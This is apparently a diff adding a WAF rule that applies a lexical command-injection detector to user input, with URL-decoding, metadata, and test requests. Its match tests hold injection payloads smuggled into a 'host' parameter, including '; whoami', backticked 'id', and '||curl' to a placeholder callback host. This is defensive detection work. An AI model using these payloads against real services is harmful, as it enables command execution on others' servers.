@@ -1,0 +1,43 @@
+# Strata gap rule (22/10/2026): the CMDi lexical detector (detect_cmdi,
+# W17-R-01, engine/src/detectors/injection/cmdi.rs) on every place the
+# client fills in. A detector reads shell syntax (separators, substitution,
+# program names, arguments), so variants of one payload need no new
+# pattern. Benign prose and paths were its review's FP set.
+# 22/10/2026: url_decode_uni first, so a payload percent-encoded once more
+# (multipart, JSON, double encoding) is read decoded too.
+rule:
+  id: 300014
+  name: Command injection (lexical detector)
+  layer: managed
+  stage: request_body
+  match:
+    all:
+    - targets: [ { var: user_input } ]
+      transforms: [ url_decode_uni ]
+      operator: { type: detect_cmdi }
+  score: 100
+  action_mode: score
+  severity: critical
+  metadata:
+    source: strata
+    license: Apache-2.0
+    owner: rules-team
+    review_by: "2027-01-22"
+    attack_type: command-injection
+    accuracy: high
+    tags: [detector, user-input]
+tests:
+  match:
+  - uri: '/v1/run?host=127.0.0.1%3B%20whoami'
+    headers: { Host: api.example.test, Accept: application/json }
+  - uri: '/v1/run?host=%60id%60'
+    headers: { Host: api.example.test, Accept: application/json }
+  - uri: '/v1/run?host=x%7C%7Ccurl%20http://cb.example.test/a'
+    headers: { Host: api.example.test, Accept: application/json }
+  no_match:
+  - uri: '/v1/notes?text=Done%3B+set+the+meeting+for+Monday'
+    headers: { Host: api.example.test, Accept: application/json }
+  - uri: '/linux/man/1/whoami'
+    headers: { Host: api.example.test, Accept: application/json }
+  - uri: '/v1/search?q=net/http+top/rated'
+    headers: { Host: api.example.test, Accept: application/json }
